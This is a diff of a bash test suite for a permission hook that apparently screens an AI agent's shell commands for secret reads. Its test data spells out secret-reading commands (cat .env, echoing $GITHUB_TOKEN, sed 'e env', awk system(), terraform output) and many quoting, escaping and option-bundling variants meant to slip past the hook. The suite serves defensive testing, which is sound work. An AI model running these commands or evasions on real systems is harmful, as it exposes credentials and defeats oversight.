+expect_in "$GU" ASK   "a path under a gitlink under submodule.recurse asks" 'git grep -n x HEAD -- subm/dir'
+expect_in "$GU" ALLOW "a blob under submodule.recurse allowed"              'git grep -n x HEAD -- clean.md'
+# A pattern word is not an option: a $, backslash or bracket in it leaves a clean revision allowed.
+expect_in "$GR" ALLOW "a pattern ending in a dollar, quoted, allowed"     "git grep -n 'x\$' HEAD~1 -- notes.md"
+expect_in "$GR" ALLOW "an -e pattern with an escaped dot allowed"         "git grep -n -e 'a\\.b' HEAD~1 -- notes.md"
+expect_in "$GR" ALLOW "an -e pattern with an alternation allowed"         "git grep -n -e 'a\\|b' HEAD~1 -- notes.md"
+expect_in "$GR" ALLOW "a bracket pattern allowed"                        "git grep -n -e '[ab]*' HEAD~1 -- notes.md"
 # A tree is listed from the revision, not the work tree: old/ and its .env are gone from the work tree.
 GD="$pt/grdel"
 mkdir -p "$GD/old"
@@ -2223,8 +2535,999 @@ expect DENY  "luajit -j value fed a secret denied"                       'luajit
 expect DENY  "osascript -s value fed a secret denied"                    'osascript -s h < .env'
 expect ALLOW "deno test with a permission flag allowed"                  'deno test --allow-env'
 
+# False alarms: quoted words, operand roles, git and heredocs
+# Probe allow globs: C# Secrets namespace folders and the CA bundles certifi and botocore ship. The fixtures are empty
+# files, shared by the subsections below.
+gf="$pt/gfa"
+mkdir -p "$gf/sec/sub" "$gf/ca/lib/certifi" "$gf/ca/plug" "$gf/cs/App/Secrets" "$gf/cs/lib/certifi"
+: >"$gf/sec/config.env"
+: >"$gf/sec/sub/config.env"
+: >"$gf/ca/lib/certifi/cacert.pem"
+: >"$gf/ca/plug/.npmrc"
+: >"$gf/cs/App/Secrets/Keys.cs"
+: >"$gf/cs/lib/certifi/cacert.pem"
+mkdir -p "$gf/cx/App/Secrets"
+: >"$gf/cx/App/Secrets/Keys.cs"
+: >"$gf/cx/App/Secrets/prod.secret"
+mkdir -p "$gf/cd/deploy.key"
+: >"$gf/cd/deploy.key/readme"
+GS="$gf/sec"
+GA="$gf/ca"
+GK="$gf/cs"
+GX="$gf/cx"
+GD="$gf/cd"
+expect ALLOW "a C# Secrets namespace file allowed"                     'cat App/Secrets/Keys.cs'
+expect ALLOW "a certifi CA bundle allowed"                              'cat lib/certifi/cacert.pem'
+expect ALLOW "a botocore CA bundle allowed"                             'cat x/botocore/cacert.pem'
+expect DENY  "any other cacert.pem denied"                              'cat x/cacert.pem'
+expect DENY  "a script in a secrets folder denied"                      'cat secrets/x.sh'
+expect DENY  "a JSON file in a secrets folder denied"                   'cat secrets/x.json'
+expect_in "$GK" ALLOW "a recursive grep over C# Secrets and a CA bundle allowed" 'grep -rn x .'
+expect_in "$GX" DENY "a recursive grep still meets a secret file in a Secrets folder" 'grep -rn x .'
+expect_in "$GD" DENY "a recursive grep still meets a directory with a secret-shaped name" 'grep -rn x .'
+
+# Quoted words: a glob or $ inside quotes, or escaped, is text, unless the command hands its words to a shell again,
+# an awk or sed program can run one, or (for $) the stage's output feeds a later stage.
+expect_in "$GA" ALLOW "a quoted pattern with a brace and a slash is no glob" "grep -c -E '[0-9]{3}|b/c' f"
+expect_in "$GA" ALLOW "an awk program's regex is no glob"          "awk '{sub(/.*x/,\"y\")} 1' f"
+expect      ALLOW "an awk address regex is no glob"               "awk '/^a.*b/ {print}' f"
+expect      ALLOW "a sed address regex is no glob"                "sed -n '/^a.*b/p' f"
+expect_in "$GS" ALLOW "a quoted * is a literal name"              "cat '*'"
+expect_in "$GS" ALLOW "an escaped * is a literal name"            'cat \*'
+expect_in "$GS" ALLOW "a quoted dir glob is a literal name"       "cat 'sub/*'"
+expect_in "$GS" ALLOW "a quoted glob operand of grep is a literal name" "grep -n x 'sub/*'"
+expect_in "$GS" ALLOW "a quoted * operand of grep is no directory glob" "grep -n x '*'"
+expect      ALLOW "a quoted secret-shaped name in a pattern is text" "grep '\$API_TOKEN' f"
+expect      ALLOW "an escaped secret-shaped name is text"         'echo \$GITHUB_TOKEN'
+expect_in "$GS" DENY  "a live * beside a quoted one expands"      "cat '*'*"
+expect_in "$GS" DENY  "an unquoted dir glob expands"              'cat sub/*'
+expect_in "$GS" DENY  "an unquoted grep operand glob expands"     'grep -n x sub/*'
+expect_in "$GS" ALLOW "two quoted * are literal"                 "cat '*'\"*\""
+expect      DENY  "a quoted secret glob is still a secret name"   "cat 'secrets/*'"
+expect_in "$GS" DENY  "tmux re-parses a quoted glob"              "tmux new-session cat 'sub/*'"
+expect      DENY  "tmux re-parses a quoted variable"              "tmux new-session echo '\$GITHUB_TOKEN'"
+expect      DENY  "watch denies a quoted variable"                "watch echo '\$GITHUB_TOKEN'"
+expect_in "$GS" DENY  "watch denies a quoted glob"                "watch cat '*'"
+expect      DENY  "a quoted variable piped on is denied"          "echo '\$GITHUB_TOKEN' | envsubst"
+expect      DENY  "awk's system() keeps a quoted variable live"   "awk 'BEGIN{system(\"echo \$GITHUB_TOKEN\")}'"
+expect      DENY  "a quoted variable in a sed program is denied"  "sed 's/x/\$GITHUB_TOKEN/' f"
+expect_in "$GA" DENY  "awk's system() keeps its regex a glob"     "awk '{system(\"ls\")} /x.*/' f"
+expect_in "$GA" DENY  "awk's print | keeps its regex a glob"      "awk '{print | \"sh\"} /x.*/' f"
+expect      DENY  "sed's e command runs a shell"                  "sed '/^a.*b/e' f"
+
+# Quoted newlines: a newline inside '…', "…" or $'…' is part of its word, and an unquoted one ends the command, so a
+# multi-line quoted command is screened word by word and a reader after a real newline is still seen.
+expect      DENY  "a secret after a multi-line single-quoted word denied"  $'cat \'a\nb\' config.env'
+expect      DENY  "a secret after a multi-line double-quoted word denied"  $'cat "a\nb" config.env'
+expect      DENY  "a secret after a multi-line ANSI-C quoted word denied"  $'cat $\'a\nb\' config.env'
+expect      DENY  "a reader on the line after a quoted newline denied"     $'echo \'a\nb\'\ncat config.env'
+expect      DENY  "a reader on the line after a double-quoted newline denied" $'echo "a\nb"\ncat config.env'
+expect      DENY  "a secret named inside a quoted newline's word denied"   $'cat \'a\nconfig.env\''
+expect      ALLOW "a multi-line single-quoted jq filter on a clean file allowed" $'jq \'.a\n| .b\' package.json'
+expect      ALLOW "a multi-line double-quoted echo allowed"                $'echo "a\nb"'
+# A fetch form whose words a quoted newline separates is still a fetch: the form's gaps stop at a newline.
+expect      DENY  "a terraform output split by a quoted newline denied"    $'terraform \'a\nb\' output -raw x'
+expect      DENY  "a tofu show split by a double-quoted newline denied"    $'tofu "a\nb" show -json'
+expect      DENY  "a terraform state pull split by a quoted newline denied" $'terraform \'a\nb\' state pull'
+expect      DENY  "an aws-vault exec split by a quoted newline denied"     $'aws-vault exec prof \'x\ny\' --json'
+expect      DENY  "a terraform -chdir ANSI-C quoted newline denied" \
+    $'terraform -chdir=$\'a\nb/..\' output -raw x'
+expect      DENY  "a terraform output -state ANSI-C quoted newline denied" $'terraform output -state=$\'s\n\' -json'
+expect      DENY  "a quote-split terraform name with a newline word denied" $'terra\'\'form \'a\nb\' output -raw x'
+expect      DENY  "a backslash-split aws-vault name with a newline word denied" $'aws-v\\ault exec prof \'x\ny\' --json'
+expect      DENY  "a joined continuation and a quoted newline in a terraform output denied" \
+    $'terraform \\\n\'a\nb\' output -raw x'
+# A deny that remains names a form that works: each remedy is pinned in the reason and its command shown to allow.
+expect_reason() {  # expect_reason <description> <cmd> <reason substring>
+    local got
+    got=$(jq -nc --arg c "$2" --arg d "$RUN_CWD" '{tool_input:{command:$c}, cwd:$d}' | "$HOOK" \
+        | jq -r '.hookSpecificOutput | select(.permissionDecision == "deny") | .permissionDecisionReason')
+    if [[ "$got" == *"$3"* ]]; then ok "$1"; else bad "$1 (reason: ${got:-none})"; fi
+}
+: >"$RUN_CWD/rem-input.txt"
+: >"$RUN_CWD/rem-pat.txt"
+: >"$RUN_CWD/rem-prog.awk"
+: >"$RUN_CWD/rem-prog.sed"
+expect_reason "a shell fed a heredoc names the here-document" \
+    $'bash -s <<EOF\nfor x in a; do echo; done\nEOF' "here-document"
+expect_reason "a shell fed a heredoc names the one-stage quoted-delimiter form" \
+    $'bash -s <<EOF\nfor x in a; do echo; done\nEOF' "cat > <file> or tee <file> here-document"
+expect_reason "an ssh command string names ssh bash -s" "ssh host 'cat x'" "ssh <host> bash -s <"
+expect_reason "a search phrase that looks like a fetch names grep -f" \
+    "grep -n 'secretsmanager get-secret-value' f" "grep -f <file>"
+expect      DENY  "a search phrase that looks like a fetch is still denied" \
+    "grep -n 'secretsmanager get-secret-value' f"
+expect_reason "a quoted secret in an awk program names awk -f" \
+    "awk 'BEGIN{system(\"echo \$GITHUB_TOKEN\")}'" "awk -f <file>"
+expect_reason "a quoted secret in an awk program names sed -f" \
+    "awk 'BEGIN{system(\"echo \$GITHUB_TOKEN\")}'" "sed -f <file>"
+expect_no_reason() {  # expect_no_reason <description> <cmd> <reason substring that must be absent from a deny>
+    local got
+    got=$(jq -nc --arg c "$2" --arg d "$RUN_CWD" '{tool_input:{command:$c}, cwd:$d}' | "$HOOK" \
+        | jq -r '.hookSpecificOutput | select(.permissionDecision == "deny") | .permissionDecisionReason')
+    if [[ -n "$got" && "$got" != *"$3"* ]]; then ok "$1"; else bad "$1 (reason: ${got:-none})"; fi
+}
+expect_reason "a commit heredoc followed by a denied reader names the reader" \
+    $'git commit -m "$(cat <<\'EOF\'\nmsg\nEOF\n)" | cat .env' "SECRET-"
+expect_no_reason "a commit heredoc followed by a denied reader carries no heredoc note" \
+    $'git commit -m "$(cat <<\'EOF\'\nmsg\nEOF\n)" | cat .env' "here-document"
+expect_no_reason "a secret read on a later line of an unquoted heredoc command carries no heredoc note" \
+    $'cat <<EOF\na\nEOF\ncat .env' "here-document"
+expect_no_reason "a secret read beside an unquoted heredoc carries no heredoc note" \
+    $'cat .env <<EOF\na\nEOF' "here-document"
+expect_reason "a secret read beside an unquoted heredoc still names the secret path" \
+    $'cat .env <<EOF\na\nEOF' "SECRET-PATH BLOCK"
+expect_no_reason "a secret read after a quoted-delimiter heredoc carries no heredoc note" \
+    $'cat > out.txt <<\'EOF\'\nx\nEOF\ncat .env' "here-document"
+expect_no_reason "a shell fed a here-string carries no heredoc note" "bash -s <<< 'echo hi'" "here-document"
+expect_no_reason "a shell fed a pipe carries no heredoc note" "echo hi | bash -s" "here-document"
+expect_reason "an ssh fed a heredoc names the ssh form" $'ssh host <<EOF\na\nEOF' "ssh <host> bash -s <"
+expect_no_reason "an ssh fed a heredoc drops the note whose bash <file> advice would run locally" \
+    $'ssh host <<EOF\na\nEOF' "here-document"
+expect_reason "a remote shell fed a heredoc names the ssh form" $'ssh host bash -s <<EOF\na\nEOF' "ssh <host> bash -s <"
+expect_no_reason "a remote shell fed a heredoc is not told to run it locally with bash <file>" \
+    $'ssh host bash -s <<EOF\na\nEOF' "'bash <file>'"
+expect_reason "an ssh fed a variable path names the literal path" \
+    'ssh host bash -s < $CLAUDE_TEMP_DIR/x.sh' "literal path"
+expect_reason "an ssh fed a variable path names ssh bash -s" 'ssh host bash -s < $CLAUDE_TEMP_DIR/x.sh' \
+    "ssh <host> bash -s <"
+expect      ALLOW "the ssh remedy with a literal path"                    "ssh host bash -s < $RUN_CWD/rem-input.txt"
+expect_reason "a quoted secret in awk beside an unquoted one blames the unquoted one" \
+    "awk 'BEGIN{system(\"echo \$GITHUB_TOKEN\")}' \$AWS_SECRET_ACCESS_KEY" "printing a secret-shaped variable"
+expect_no_reason "a quoted secret in awk beside an unquoted one is not called quoted" \
+    "awk 'BEGIN{system(\"echo \$GITHUB_TOKEN\")}' \$AWS_SECRET_ACCESS_KEY" "is quoted"
+expect      ALLOW "the heredoc remedy's bash <file> with a variable path" 'bash $CLAUDE_TEMP_DIR/x.sh'
+expect      ALLOW "the fetch remedy with a variable path"              'grep -f $CLAUDE_TEMP_DIR/pat.txt rem-input.txt'
+expect      ALLOW "the echo remedy with a variable path"                  'awk -f $CLAUDE_TEMP_DIR/p.awk rem-input.txt'
+expect      ALLOW "the ssh remedy: ssh host bash -s < file"               'ssh host bash -s < rem-input.txt'
+expect      ALLOW "the fetch remedy: grep -f pattern file"                'grep -f rem-pat.txt rem-input.txt'
+expect      ALLOW "the echo remedy: awk -f program file"                  'awk -f rem-prog.awk rem-input.txt'
+expect      ALLOW "the echo remedy: sed -f program file"                  'sed -f rem-prog.sed rem-input.txt'
+# A script file that is standard input or a descriptor holds a program the hook cannot see.
+expect      DENY  "sed -f - fed a here-string"                            "sed -f - f <<< '1e env'"
+expect      DENY  "sed -f - fed a pipe"                                   "echo '1e env' | sed -f - f"
+expect      DENY  "sed -f /dev/stdin"                                     'sed -f /dev/stdin f'
+expect      DENY  "sed -f on a descriptor"                                'sed -f /dev/fd/3 f'
+expect      DENY  "sed -f on a /proc descriptor"                          'sed -f /proc/self/fd/0 f'
+expect      DENY  "sed -nf - in a bundle"                                 'sed -nf - f'
+expect      DENY  "sed -f joined to its value"                            'sed -f- f'
+expect      DENY  "sed --file=-"                                          'sed --file=- f'
+expect      DENY  "sed --file - as two words"                             'sed --file - f'
+expect      DENY  "sed -f with a variable name"                           'sed -f "$P" f'
+expect      DENY  "sed -f with a name built after the temp directory"     'sed -f "$CLAUDE_TEMP_DIR/$P" f'
+expect      DENY  "awk -f climbing out of the temp directory"             'awk -f "$CLAUDE_TEMP_DIR/../p.awk" f'
+expect      ALLOW "sed -f program file in the temp directory"             'sed -f "$CLAUDE_TEMP_DIR/p.sed" f'
+expect      ALLOW "awk --file=program file in the braced temp directory"  'awk --file="${CLAUDE_TEMP_DIR}/p.awk" f'
+expect      DENY  "awk -f - fed a here-string"                            "awk -f - <<< 'BEGIN{system(\"env\")}'"
+expect      DENY  "awk -f /dev/stdin"                                     'awk -f /dev/stdin f'
+expect      DENY  "awk -f joined to /dev/stdin"                           'awk -f/dev/stdin f'
+expect      DENY  "awk --file=-"                                          'awk --file=- f'
+expect      DENY  "awk --file on a descriptor"                            'awk --file /dev/fd/0 f'
+expect      DENY  "gawk -E -"                                             'gawk -E - f'
+expect      DENY  "awk -F, -f -"                                          'awk -F, -f - f'
+expect      ALLOW "awk -f program file with a separator option"           'awk -F, -f prog.awk f'
+expect      ALLOW "awk --file=program file"                               'awk --file=prog.awk f'
+expect      ALLOW "awk -E program file"                                   'awk -E prog.awk f'
+expect      ALLOW "sed -nf program file"                                  'sed -nf prog.sed f'
+expect      ALLOW "sed --file=program file"                               'sed --file=prog.sed f'
+expect      ALLOW "sed -f program file, standard input as data"           'sed -f prog.sed -'
+# Options bundled, abbreviated or hidden behind another option still carry the script file.
+expect      DENY  "awk -bf - in a bundle"                                 'awk -bf - f'
+expect      DENY  "awk --fi - as a long-option prefix"                    'awk --fi - f'
+expect      DENY  "awk --ex=- as a long-option prefix"                    'awk --ex=- f'
+expect      DENY  "awk --fil=/dev/stdin as a long-option prefix"          'awk --fil=/dev/stdin f'
+expect      DENY  "mawk -W exec -"                                        'mawk -W exec - f'
+expect      DENY  "mawk -Wexec -"                                         'mawk -Wexec - f'
+expect      DENY  "mawk -We -"                                            'mawk -We - f'
+expect      DENY  "mawk -Wexec=-"                                         'mawk -Wexec=- f'
+expect      DENY  "awk -f with an unquoted glob in the script name"       'awk -f /dev/std* f'
+expect      DENY  "awk -f with a brace in the script name" 'awk -f /dev/{stdin,x} f'
+expect      DENY  "sed -f with a brace in the script name"                'sed -f /dev/{stdin,x} f'
+expect      DENY  "awk -f with a glob that spells no dev or stdin"        'awk -f /d?v/s*in f'
+expect      DENY  "sed -f with a brace that spells no dev or stdin"       'sed -f /d{e,}v/s{t,}din f'
+expect      DENY  "sed -l hiding an -f behind its value slot"             'sed -l -f - f'
+expect      DENY  "sed --line-length hiding an -f behind its value slot"  'sed --line-length -f - f'
+expect      DENY  "sed -zf - in a bundle"                                 'sed -zf - f'
+expect      DENY  "sed -nzf - in a bundle"                                'sed -nzf - f'
+expect      DENY  "sed -Xf - behind an unknown letter"                    'sed -Xf - f'
+expect      DENY  "sed -Xe behind an unknown letter runs an e command"    "sed -Xe 'e env' f"
+expect      DENY  "sed -f with an escape in the script name"              "sed -f \$'p\\x2e.sed' f"
+expect      ALLOW "sed -l with a number leaves the program"               'sed -l 5 p f'
+expect      ALLOW "sed -n -e p"                                           'sed -n -e p f'
+expect      ALLOW "sed -nE with an s command"                             "sed -nE 's/a/b/' f"
+expect      ALLOW "awk -F, with a program"                                "awk -F, '{print}' f"
+expect      ALLOW "awk -v with a program"                                 "awk -v x=1 '{print}' f"
+expect      ALLOW "awk -Ff takes f as the separator"                      "awk -Ff '{print}' f"
+expect      ALLOW "awk --field-separator is no script option"            "awk --field-separator=, '{print}' f"
+expect      ALLOW "awk -bf with a plain script file"                      'awk -bf prog.awk f'
+expect      ALLOW "mawk -W version"                                       'mawk -W version'
+expect      ALLOW "a quoted glob in a script name is a literal name"      "sed -f 'my[1].sed' f"
+# gawk's -i and --include load source from a file, -l and --load an extension: their values are screened like -f's.
+expect      DENY  "awk -i on standard input"                              "awk -i /dev/stdin 'BEGIN{}' f"
+expect      DENY  "awk --include=-"                                       "awk --include=- 'BEGIN{}' f"
+expect      DENY  "awk --inc as a long-option prefix"                     "awk --inc - 'BEGIN{}' f"
+expect      DENY  "awk -il with the next word on standard input"          "awk -il /dev/stdin 'BEGIN{}' f"
+expect      DENY  "awk -l on a descriptor"                                "awk -l /dev/fd/3 'BEGIN{}' f"
+expect      DENY  "awk --load=-"                                          "awk --load=- 'BEGIN{}' f"
+expect      ALLOW "awk -i with a plain library file"                      "awk -i lib.awk '{print}' f"
+expect      ALLOW "awk -i joined to a plain library file"                 "awk -ilib.awk '{print}' f"
+expect      ALLOW "awk -l with an extension name"                         "awk -l filefuncs '{print}' f"
+expect      ALLOW "awk --include= a plain library file"                   "awk --include=lib.awk '{print}' f"
+# A brace in a script name under the temp directory is expanded into literal names, which are then screened.
+expect      ALLOW "awk -f in the temp directory"                          'awk -f $CLAUDE_TEMP_DIR/p.awk f'
+expect      ALLOW "awk -f with a brace in the temp directory expands to plain names" \
+    'awk -f $CLAUDE_TEMP_DIR/{a,b}.awk f'
+expect      ALLOW "the heredoc remedy: a one-stage cat > heredoc" \
+    $'cat > out.txt <<\'EOF\'\nfor x in y; do\nEOF'
+expect      ALLOW "the heredoc remedy: a one-stage tee heredoc"           $'tee out.txt <<\'EOF\'\nbody\nEOF'
+# A quoted-delimiter cat or tee heredoc that writes a file has an inert body, screened as text and never as commands.
+expect      ALLOW "a single-quoted cat > heredoc writes a file" \
+    $'cat > out.txt <<\'EOF\'\n#!/usr/bin/env python3\nfor x in y; do\nEOF'
+expect      ALLOW "a double-quoted cat >> heredoc writes a file"           $'cat >> out.txt <<"EOF"\nline $(id)\nEOF'
+expect      ALLOW "a backslash-quoted cat > heredoc writes a file"         $'cat > out.txt <<\\EOF\n`a`\nEOF'
+expect      ALLOW "a <<- cat > heredoc with a tab-indented closer"         $'cat > out.txt <<-\'EOF\'\n\tbody\n\tEOF'
+expect      ALLOW "a cat <<'EOF' > file heredoc with a final newline"      $'cat <<\'EOF\' > out.txt\nbody\nEOF\n'
+expect      ALLOW "a tee heredoc writes a file"                            $'tee out.txt <<\'EOF\'\nbody\nEOF'
+expect      ALLOW "a tee -a heredoc writes two files"                      $'tee -a a.txt b.txt <<\'EOF\'\nbody\nEOF'
+expect      ALLOW "a cat > \$CLAUDE_TEMP_DIR heredoc writes a file" \
+    $'cat > $CLAUDE_TEMP_DIR/x.py <<\'EOF\'\nx\nEOF'
+expect      ALLOW "a cat >> \${CLAUDE_TEMP_DIR} heredoc writes a file" \
+    $'cat >> ${CLAUDE_TEMP_DIR}/x.py <<\'EOF\'\nx\nEOF'
+expect      ALLOW "a tee \"\$CLAUDE_TEMP_DIR\" heredoc writes a file" \
+    $'tee -a "$CLAUDE_TEMP_DIR"/x.py <<\'EOF\'\nx\nEOF'
+expect      ALLOW "a secret read named in a heredoc body is text"          $'cat > out.txt <<\'EOF\'\ncat .env\nEOF'
+expect      ASK   "an unquoted-delimiter cat heredoc with a substitution asks" $'cat > out.txt <<EOF\n$(id)\nEOF'
+expect      DENY  "a cat heredoc piped to a shell denied"                  $'cat <<\'EOF\' | sh\necho hi\nEOF'
+expect      DENY  "a reader of a secret after the closing line denied" \
+    $'cat > out.txt <<\'EOF\'\nbody\nEOF\ncat .env'
+expect      DENY  "a reader of a secret after a second EOF denied" \
+    $'cat > out.txt <<\'EOF\'\nEOF\ncat .env\nEOF'
+expect      DENY  "a secret read on the heredoc's own first line denied"   $'cat config.env > out.txt <<\'EOF\'\nx\nEOF'
+expect      ALLOW "a cat heredoc at the size bound writes a file, its body text" \
+    "cat > out.txt <<'EOF'"$'\n'"$(printf 'x%.0s' {1..32733})"$'\ncat .env\nEOF'
+expect      DENY  "a cat heredoc one character over the size bound is screened whole" \
+    "cat > out.txt <<'EOF'"$'\n'"$(printf 'x%.0s' {1..32734})"$'\ncat .env\nEOF'
+# A sed or awk program may also come from an option, or from a file the hook cannot see; an interpreter may hand its
+# arguments to a shell.
+expect_in "$GA" DENY  "an address before sed's e keeps its glob live" "sed '1e ls **/x' f"
+expect_in "$GA" DENY  "sed -e's e keeps its glob live"                "sed -e '1e ls **/x' f"
+expect_in "$GA" DENY  "sed --expression='s e keeps its glob live"    "sed --expression='1e ls **/x' f"
+expect_in "$GA" DENY  "a joined sed -e program keeps its glob live"   "sed -n -e'1e ls **/x' f"
+expect_in "$GA" DENY  "BSD sed -i's value leaves the next word the program" "sed -i '' '1e ls **/x' f"
+expect_in "$GA" DENY  "sed -f keeps a quoted glob live"              "sed -f s.sed '**/x' f"
+expect      ALLOW "an e inside a sed address regex is no e command" "sed -n '/^a.*e/p' f"
+expect_in "$GA" DENY  "gawk --source's system() keeps its regex a glob" "gawk --source='{system(\"ls\")} /x.*/' f"
+expect_in "$GA" DENY  "awk -f keeps a quoted glob live"              "awk -f p.awk '**/x'"
+expect_in "$GA" ALLOW "awk -F leaves the program's regex text"       "awk -F, '{print \$1} /a{3}/' f"
+expect_in "$GS" DENY  "an interpreter may hand a quoted glob to a shell" "perl -e 'system(\"cat @ARGV\")' '*'"
+# A sed e command, or an s///e flag, runs a shell string; a sed program the hook cannot parse is held to the same.
+expect      DENY  "sed's e command after an address runs a shell"  "sed '1e env' f"
+expect      DENY  "sed -e's e command runs a shell"                "sed -e '1e printenv' f"
+expect      DENY  "sed --expression's e command runs a shell"      "sed --expression='1e cat *' f"
+expect      DENY  "sed's s///e flag runs a shell"                  "sed 's|.*|env|e' f"
+expect      DENY  "an e command in a later -e program runs a shell" "sed -e '/x/{e env' -e '}' f"
+expect      DENY  "an e command is read when an operand is named sed" "sed -e '1e env' sed f"
+expect      DENY  "an e command is read when an operand is named awk" "sed awk -e '1e env' f"
+# A sed r or R command reads its file name to the end of its line, whatever line of the program it is on.
+expect      DENY  "sed's r on a secret file in a block on its own line"  $'sed \'1{\nr config.env\n}\' f'
+expect      DENY  "sed's r on a secret file after an address, ending the line" $'sed \'/x/r config.env\n\' f'
+expect      DENY  "sed's r on a secret path in a directory, mid-program"  $'sed -n \'/a/{\nr sub/config.env\np\n}\' f'
+expect      DENY  "sed's R on a secret file ahead of another command"     $'sed \'R config.env\nd\' f'
+expect      DENY  "sed's r on a secret file in a later -e value"          "sed -e '1{' -e 'r config.env' -e '}' f"
+expect      DENY  "sed's r on a secret file in a \$'...' program with an escaped newline" \
+    $'sed $\'r config.env\\np\' f'
+expect      DENY  "sed's r on an escaped secret name in a \$'...' program" $'sed $\'r \\x63onfig.env\\np\' f'
+expect      ALLOW "sed's r on an ordinary file in a block on its own line" $'sed \'1{\nr notes.txt\n}\' f'
+expect      ALLOW "sed's r on an ordinary file on one line"               "sed 'r notes.txt' f"
+expect      ALLOW "sed's w on a file in a block on its own line is no read" $'sed \'1{\nw out.txt\n}\' f'
+expect      ALLOW "an escaped newline in an s replacement stays allowed"  "sed 's/a/b\\n/' f"
+# An escape of a $'...' program stays as written, so the program parsed is not the one sed gets.
+expect      DENY  "sed's r on a name built from a \$'...' escape"          $'sed $\'r config\\x2eenv\' f'
+expect      DENY  "sed's r in a block of a \$'...' program with newline escapes" $'sed $\'1{\\nr config.env\\n}\' f'
+expect      DENY  "a \$'...' sed program holding a backslash, even for an ordinary file" \
+    $'sed $\'1{\\nr notes.txt\\n}\' f'
+expect      ALLOW "a quoted sed program with a backslash escape stays allowed" 'sed ":a;N;\$!ba;s/\\n/ /g" f'
+# A name the hook cannot screen (a backslash) is denied whichever bracket reading parses the rest.
+expect      DENY  "sed's r written with a \$'...' escape on an ordinary file" $'sed $\'\\x72 notes.txt\' f'
+expect      DENY  "sed's r on a backslash name denied when only one bracket reading parses" \
+    "sed 's/[/]/;r a\\b/' f"
+expect      DENY  "sed's r on a backslash name denied" "sed 'r a\\b' f"
+expect      ALLOW "sed's r on an ordinary name after a bracket one reading parses" "sed 's/[/]/;r notes.txt/' f"
+# BSD sed -i takes a suffix word, and the next operand is the program; GNU's -i takes none.
+expect      DENY  "sed -i '' with an r block on a secret file" $'sed -i \'\' \'1{\nr config.env\n}\' f'
+expect      DENY  "sed -i with an r block on a secret file" $'sed -i \'1{\nr config.env\n}\' f'
+expect      DENY  "sed -i.bak with an r block on a secret file" $'sed -i.bak \'1{\nr config.env\n}\' f'
+expect      DENY  "sed -i '' with an r on a secret file" "sed -i '' 'r config.env' f"
+expect      DENY  "sed -i '' with an unparseable program" "sed -i '' 'k' f"
+expect      DENY  "a sed named by sudo -u before the real one reads a secret in a block" \
+    $'sudo -u sed sed \'1{\nr config.env\n}\' f'
+expect      ALLOW "sed -i '' with an r block on an ordinary file" $'sed -i \'\' \'1{\nr notes.txt\n}\' f'
+expect      ALLOW "sed -i '' with a plain program" "sed -i '' p f"
+expect      ALLOW "sed -i '' with an s command" "sed -i '' 's/a/b/' f"
+expect      DENY  "an unparseable sed program is denied"           "sed 'k' f"
+expect      DENY  "an unterminated sed s command is denied"        "sed 's/a/b' f"
+expect      ALLOW "sed with a range and a regex address"           "sed -n '/pattern/,/end/p' f"
+expect      ALLOW "sed with two s commands"                        "sed 's/name/x/; s/foo/bar/g' f"
+expect      ALLOW "sed with a line range"                          "sed '1,5d' f"
+expect      ALLOW "sed with a regex address and p"                 "sed -n '/^a.*b/p' f"
+expect      ALLOW "sed with y"                                     "sed 'y/abc/xyz/' f"
+expect      ALLOW "a sed append whose text holds an e"             "sed -e '\$a\\' -e 'see here' f"
+expect      ALLOW "a one-line sed append whose text holds an e"    "sed '\$a see here' f"
+expect      ALLOW "sed with a bracket holding the delimiter"       "sed 's/[^/]*\$//' f"
+expect      ALLOW "sed with an escaped delimiter in a bracket"     "sed 's/[\\/]/_/g' f"
+expect      ALLOW "sed with a label, a branch and a block"         "sed ':a;N;\$!ba;s/\\n/ /g' f"
+expect      ALLOW "sed with a block of commands"                   "sed -n '2,/z/{p;q}' f"
+expect      ALLOW "sed -i leaves the file operand alone"           "sed -i 's/a/b/' f"
+expect      ALLOW "BSD sed -i leaves its suffix and the file alone" "sed -i '' 's/a/b/' f"
+expect      ALLOW "a bare long option leaves the file operand alone" "sed --quiet p f"
+expect      ALLOW "sed -f leaves the file operand alone"           "sed -f s.sed f"
+expect      ALLOW "a sed file operand named e is no program once -e is given" "sed -e p e"
+expect      DENY  "a wrapper's option value named awk does not hide a sed stage" "sudo -u awk sed '1e env' f"
+expect      DENY  "a known false deny: a wrapped grep for the word sed (nice)" "nice grep -rn sed ."
+expect      DENY  "a known false deny: a wrapped grep for the word sed (time)" "time grep sed f"
+expect      DENY  "a known false deny: a wrapped grep for the word sed (xargs)" "xargs grep sed src/"
+expect      ALLOW "a wrapped sed with a range and a regex address"  "nice sed -n '/pattern/,/end/p' f"
+expect      ALLOW "a wrapped sed named twice is one stage"          "nice sed -n p sed"
+expect      DENY  "a wrapper's option value named sed does not hide the sed stage" "sudo -u sed sed '1e env' f"
+expect      DENY  "a later sed name does not clear a program already read" "nice sed -e '1e env' f sed"
+expect      DENY  "a later sed name starts the operand walk again"  "nice sed -n p sed '1e env' f"
+expect      DENY  "a program ending in a sed name is not dropped unread" "nice sed '1e env/sed'"
+expect      DENY  "a file operand ending in a sed name still meets the strict parse" "nice sed -n p '1e env/sed' f"
+expect      DENY  "an operand that may be the program is not dropped unread" "nice sed --x p '1e env/sed'"
+expect      ALLOW "a path-invoked sed after a wrapper is read as a stage" \
+    "nice /usr/bin/sed -n '/pattern/,/end/p' f"
+expect      DENY  "a path-invoked sed after a wrapper has its program read" "nice /usr/bin/sed '1e env' f"
+expect      DENY  "a path-invoked sed after an awk option value is ambiguous" "sudo -u awk /usr/bin/sed '1e env' f"
+expect      DENY  "a path-form sed name starts the operand walk again" "nice sed -n p ./sed '1e env' f"
+expect      ALLOW "a path-form sed name is no operand of the earlier walk" "nice sed -n p /usr/bin/sed"
+expect      DENY  "an unparseable operand after an unknown option is denied" "sed --x p k f"
+expect      DENY  "an e command in the second operand after an unknown option" "sed --x p '1e env' f"
+expect      ALLOW "sed -l leaves its value alone"                  "sed -l 5 p f"
+expect      ALLOW "sed --line-length leaves its value alone"       "sed --line-length 5 p f"
+expect      ALLOW "BSD sed -i leaves its suffix alone"            "sed -i .bak 's/a/b/' f"
+expect      ALLOW "sed -i leaves a suffix with a dot alone"        "sed -i.bak 's/a/b/' f"
+expect      DENY  "mawk is a reader"                               "mawk 1 config.env"
+expect      DENY  "nawk is a reader"                               "nawk 1 config.env"
+expect_in "$GA" DENY  "mawk's system() keeps its regex a glob"     "mawk '{system(\"ls\")} /x.*/' f"
+expect_in "$GA" DENY  "nawk's system() keeps its regex a glob"     "nawk '{system(\"ls\")} /x.*/' f"
+expect_in "$GA" DENY  "gawk @include keeps its regex a glob"       "gawk '@include \"x\"; {x} /x.*/' f"
